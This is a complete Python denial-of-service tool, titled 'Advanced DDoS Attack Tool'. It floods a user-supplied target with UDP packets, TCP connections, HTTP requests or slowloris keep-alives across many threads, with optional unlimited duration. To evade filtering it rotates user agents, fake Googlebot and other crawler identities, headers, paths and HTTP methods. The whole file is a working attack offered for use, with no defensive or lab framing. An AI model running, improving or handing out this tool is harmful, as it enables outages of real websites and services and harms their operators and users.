#!/usr/bin/env python3
import socket
import threading
import time
import random
from typing import List, Dict, Optional
import sys

class UserAgentRotator:
    def __init__(self):
        self.user_agents = self._load_user_agents()
        self.headers_pool = self._load_headers_pool()
        self.paths = self._load_paths()
        self.methods = ["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS"]

    def _load_user_agents(self):
        agents = []

        # Chrome versions
        chrome_versions = ["120.0.0.0", "119.0.0.0", "118.0.0.0", "117.0.0.0", "116.0.0.0",
                          "115.0.0.0", "114.0.0.0", "113.0.0.0", "112.0.0.0", "111.0.0.0",
                          "110.0.0.0", "109.0.0.0", "108.0.0.0", "107.0.0.0", "106.0.0.0",
                          "105.0.0.0", "104.0.0.0", "103.0.0.0", "102.0.0.0", "101.0.0.0",
                          "100.0.0.0", "99.0.0.0", "98.0.0.0", "97.0.0.0", "96.0.0.0"]

        os_templates = [
            "Windows NT 10.0; Win64; x64",
            "Windows NT 10.0; WOW64",
            "Windows NT 6.3; Win64; x64",
            "Macintosh; Intel Mac OS X 10_15_7",
            "Macintosh; Intel Mac OS X 10_14_6",
            "X11; Linux x86_64",
            "X11; Ubuntu; Linux x86_64",
        ]

        for os_str in os_templates:
            for ver in chrome_versions:
                agents.append(f"Mozilla/5.0 ({os_str}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver} Safari/537.36")

        # Firefox versions
        firefox_versions = ["121.0", "120.0", "119.0", "118.0", "117.0", "116.0", "115.0",
                           "114.0", "113.0", "112.0", "111.0", "110.0", "109.0", "108.0",
                           "107.0", "106.0", "105.0", "104.0", "103.0", "102.0", "101.0"]

        firefox_os = [
            "Windows NT 10.0; Win64; x64",
            "Windows NT 10.0; WOW64",
            "Macintosh; Intel Mac OS X 10.15",
            "X11; Linux x86_64",
            "X11; Ubuntu; Linux x86_64",
        ]

        for os_str in firefox_os:
            for ver in firefox_versions:
                agents.append(f"Mozilla/5.0 ({os_str}; rv:{ver}) Gecko/20100101 Firefox/{ver}")

        # Safari versions
        safari_versions = ["17.0", "16.6", "16.5", "16.4", "16.3", "16.2", "16.1", "16.0",
                          "15.6", "15.5", "15.4", "15.3", "15.2", "15.1", "15.0"]

        for ver in safari_versions:
            agents.append(f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{ver} Safari/605.1.15")
            agents.append(f"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{ver} Mobile/15E148 Safari/604.1")
            agents.append(f"Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{ver} Mobile/15E148 Safari/604.1")

        # Edge versions
        edge_versions = ["120.0.0.0", "119.0.0.0", "118.0.0.0", "117.0.0.0", "116.0.0.0"]
        for ver in edge_versions:
            agents.append(f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/{ver}")

        # Mobile browsers
        mobile_agents = [
            "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        ]
        agents.extend(mobile_agents)

        # Opera, Brave, Vivaldi
        agents.extend([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Brave/120.0.0.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Vivaldi/6.5.3206.54",
        ])

        # Bot/crawler agents for mixed traffic
        agents.extend([
            "Googlebot/2.1 (+http://www.google.com/bot.html)",
            "bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
            "Slurp/3.0 (http://help.yahoo.com/help/us/ysearch/slurp)",
            "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
            "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
            "Twitterbot/1.0",
            "LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com)",
        ])

        # Randomize and return
        random.shuffle(agents)
        return agents

    def _load_headers_pool(self):
        return [
            {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Cache-Control": "max-age=0",
                "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
            },
            {
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive",
                "Cache-Control": "no-cache",
                "Pragma": "no-cache",
            },
            {
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.8",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "X-Requested-With": "XMLHttpRequest",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
            },
            {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-GB,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "cross-site",
            },
            {
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.7",
                "Accept-Encoding": "gzip",
                "Connection": "close",
                "Host": "",
                "User-Agent": "",
                "Referer": "",
            },
        ]

    def _load_paths(self):
        return [
            "/", "/index.html", "/index.php", "/home", "/main",
            "/api", "/api/v1", "/api/v2", "/api/v3", "/api/users", "/api/data",
            "/login", "/register", "/signin", "/signup", "/auth",
            "/search", "/query", "/find", "/lookup",
            "/admin", "/administrator", "/wp-admin", "/dashboard", "/panel",
            "/assets/css", "/assets/js", "/assets/images",
            "/css/style.css", "/js/main.js", "/js/app.js",
            "/images/logo.png", "/images/banner.jpg", "/img/icon.png",
            "/favicon.ico", "/robots.txt", "/sitemap.xml", "/manifest.json",
            "/health", "/status", "/ping", "/metrics", "/info",
            "/download", "/upload", "/file", "/media",
            "/blog", "/news", "/article", "/post",
            "/product", "/item", "/shop", "/store",
            "/about", "/contact", "/help", "/support",
            "/privacy", "/terms", "/legal", "/policy",
        ]

    def get_random_request(self, target: str, port: int) -> str:
        ua = random.choice(self.user_agents)
        headers = random.choice(self.headers_pool).copy()
        path = random.choice(self.paths)
        method = random.choice(self.methods)

        # Build request
        request_lines = [
            f"{method} {path} HTTP/1.1",
            f"Host: {target}:{port}",
            f"User-Agent: {ua}",
        ]

        # Add headers in random order
        header_items = list(headers.items())
        random.shuffle(header_items)

        for key, value in header_items:
            if key == "Host":
                continue  # Already set
            if key == "User-Agent":
                continue  # Already set
            request_lines.append(f"{key}: {value}")

        # Sometimes add referer
        if random.random() < 0.4:
            request_lines.append(f"Referer: https://{target}/")

        # Sometimes add cookies
        if random.random() < 0.2:
            cookie = f"session={random.randint(1000000, 9999999)}; user_id={random.randint(1, 1000)}"
            request_lines.append(f"Cookie: {cookie}")

        # Add body for POST/PUT
        if method in ["POST", "PUT"] and random.random() < 0.5:
            body = f"data={random.randint(1, 1000)}&action=submit"
            request_lines.append(f"Content-Type: application/x-www-form-urlencoded")
            request_lines.append(f"Content-Length: {len(body)}")
            request_lines.append("")
            request_lines.append(body)

        request = "\r\n".join(request_lines) + "\r\n\r\n"
        return request


class DDoSAttack:
    def __init__(self, target: str, port: int, threads: int = 100, requests: int = 0,
                 byte_size: int = 1024, duration: int = 0, rotator: UserAgentRotator = None):
        self.target = target
        self.port = port
        self.threads = threads
        self.requests = requests
        self.byte_size = byte_size
        self.duration = duration
        self.running = False
        self.attack_threads: List[threading.Thread] = []
        self.request_counter = 0
        self.counter_lock = threading.Lock()
        self.start_time = None
        self.rotator = rotator or UserAgentRotator()

    def udp_flood(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        sent = 0
        while self.running:
            if self.duration > 0 and (time.time() - self.start_time) >= self.duration:
                break
            if self.requests > 0:
                with self.counter_lock:
                    if self.request_counter >= self.requests:
                        break
                    self.request_counter += 1
            try:
                payload = bytes(random.getrandbits(8) for _ in range(self.byte_size))
                sock.sendto(payload, (self.target, self.port))
                sent += 1
                if sent % 10000 == 0:
                    print(f"[UDP-{threading.current_thread().name}] Sent {sent} packets")
            except Exception as e:
                print(f"[UDP-{threading.current_thread().name}] Error: {e}")
                break
        sock.close()
        print(f"[UDP-{threading.current_thread().name}] Finished - sent {sent} packets")

    def tcp_syn_flood(self):
        sent = 0
        while self.running:
            if self.duration > 0 and (time.time() - self.start_time) >= self.duration:
                break
            if self.requests > 0:
                with self.counter_lock:
                    if self.request_counter >= self.requests:
                        break
                    self.request_counter += 1
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect_ex((self.target, self.port))
                time.sleep(0.005)
                sock.close()
                sent += 1
                if sent % 1000 == 0:
                    print(f"[TCP-{threading.current_thread().name}] Sent {sent} SYNs")
            except Exception:
                pass
        print(f"[TCP-{threading.current_thread().name}] Finished - sent {sent} SYNs")

    def http_flood(self):
        sent = 0
        while self.running:
            if self.duration > 0 and (time.time() - self.start_time) >= self.duration:
                break
            if self.requests > 0:
                with self.counter_lock:
                    if self.request_counter >= self.requests:
                        break
                    self.request_counter += 1
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((self.target, self.port))

                request = self.rotator.get_random_request(self.target, self.port)
                sock.send(request.encode())
                sock.close()
                sent += 1

                if sent % 500 == 0:
                    print(f"[HTTP-{threading.current_thread().name}] Sent {sent} requests")
            except Exception:
                pass
        print(f"[HTTP-{threading.current_thread().name}] Finished - sent {sent} requests")

    def slowloris(self):
        sockets = []
        sent = 0

        # Initial connection burst
        for _ in range(min(200, self.threads)):
            if not self.running:
                break
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((self.target, self.port))
                request = self.rotator.get_random_request(self.target, self.port)
                s.send(request.encode())
                sockets.append(s)
            except Exception:
                pass

        print(f"[Slowloris] Established {len(sockets)} connections")

        # Keep connections alive
        while self.running:
            if self.duration > 0 and (time.time() - self.start_time) >= self.duration:
                break
            for s in sockets[:]:
                try:
                    s.send(b"X-a: b\r\n")
                    sent += 1
                except Exception:
                    sockets.remove(s)
                    # Try to reconnect
                    try:
                        new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        new_s.settimeout(10)
                        new_s.connect((self.target, self.port))
                        request = self.rotator.get_random_request(self.target, self.port)
                        new_s.send(request.encode())
                        sockets.append(new_s)
                    except Exception:
                        pass
            time.sleep(10)

        for s in sockets:
            try:
                s.close()
            except:
                pass
        print(f"[Slowloris] Finished - sent {sent} keep-alives")

    def start(self, attack_type: str = "udp"):
        self.running = True
        self.start_time = time.time()
        print(f"[+] Starting {attack_type.upper()} attack on {self.target}:{self.port}")
        print(f"[+] Using {self.threads} threads")
        print(f"[+] User agents loaded: {len(self.rotator.user_agents)}")
        print(f"[+] Header templates: {len(self.rotator.headers_pool)}")
        print(f"[+] Paths: {len(self.rotator.paths)}")

        attack_func = {
            "udp": self.udp_flood,
            "tcp": self.tcp_syn_flood,
            "http": self.http_flood,
            "slowloris": self.slowloris
        }.get(attack_type, self.udp_flood)

        print(f"[+] Spawning {self.threads} threads...")
        for i in range(self.threads):
            thread = threading.Thread(target=attack_func, name=f"Attack-{i}")
            thread.start()
            self.attack_threads.append(thread)
        print(f"[+] All {len(self.attack_threads)} threads started")

    def stop(self):
        self.running = False
        print("[+] Stopping attack...")
        for thread in self.attack_threads:
            thread.join(timeout=1)
        self.attack_threads.clear()
        print("[+] Attack stopped")


def validate_target(target: str) -> bool:
    try:
        socket.inet_aton(target)
        return True
    except socket.error:
        pass

    try:
        socket.gethostbyname(target)
        return True
    except socket.gaierror:
        print(f"[!] Could not resolve hostname: {target}")
        print(f"[!] Try using the direct IP address instead")
        return False


def main():
    try:
        print("=== Advanced DDoS Attack Tool ===")
        print("Features: User-Agent rotation, Header rotation, Path rotation\n")

        target = input("Enter target IP or hostname: ").strip()
        print(f"[1] Target: {target}")

        port = int(input("Enter target port: ").strip())
        print(f"[2] Port: {port}")

        threads = int(input("Enter number of threads: ").strip())
        print(f"[3] Threads: {threads}")

        requests = int(input("Enter number of requests (0 for unlimited): ").strip())
        print(f"[4] Requests: {requests}")

        duration = int(input("Enter duration in seconds (0 for unlimited): ").strip())
        print(f"[5] Duration: {duration}")

        byte_size = int(input("Enter payload size in bytes: ").strip())
        print(f"[6] Byte size: {byte_size}")

        method = input("Enter attack method (udp/tcp/http/slowloris): ").strip().lower()
        print(f"[7] Method: {method}")

        if method not in ["udp", "tcp", "http", "slowloris"]:
            print("[-] Invalid method. Using UDP.")
            method = "udp"

        print("[8] Validating target...")
        if not validate_target(target):
            print(f"[-] Invalid target: {target}")
            return

        if port < 1 or port > 65535:
            print("[-] Invalid port number")
            return

        print("[9] Creating attack object...")
        rotator = UserAgentRotator()
        attack = DDoSAttack(target, port, threads, requests, byte_size, duration, rotator)

        print(f"\n[*] Starting {method.upper()} attack on {target}:{port}")
        print(f"[*] Threads: {threads}")
        print(f"[*] Requests: {'Unlimited' if requests == 0 else requests}")
        print(f"[*] Duration: {'Unlimited' if duration == 0 else f'{duration} seconds'}")
        print(f"[*] Payload size: {byte_size} bytes")
        print(f"[*] User agents: {len(rotator.user_agents)}")
        print(f"[*] Header templates: {len(rotator.headers_pool)}")
        print(f"[*] Paths: {len(rotator.paths)}\n")

        print("[10] Calling attack.start()...")
        attack.start(method)

        print("[11] Waiting for threads to start...")
        time.sleep(1)

        print(f"[12] Active threads: {len(attack.attack_threads)}")
        print(f"[13] Attack running: {attack.running}\n")

        if duration > 0:
            print(f"[14] Running for {duration} seconds...")
            while (time.time() - attack.start_time) < duration and attack.running:
                time.sleep(0.1)
        else:
            print("[14] Running indefinitely (Ctrl+C to stop)...")
            while attack.running:
                time.sleep(0.1)

        attack.running = False
        print("\n[+] Attack completed")
        for thread in attack.attack_threads:
            thread.join(timeout=2)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    main()
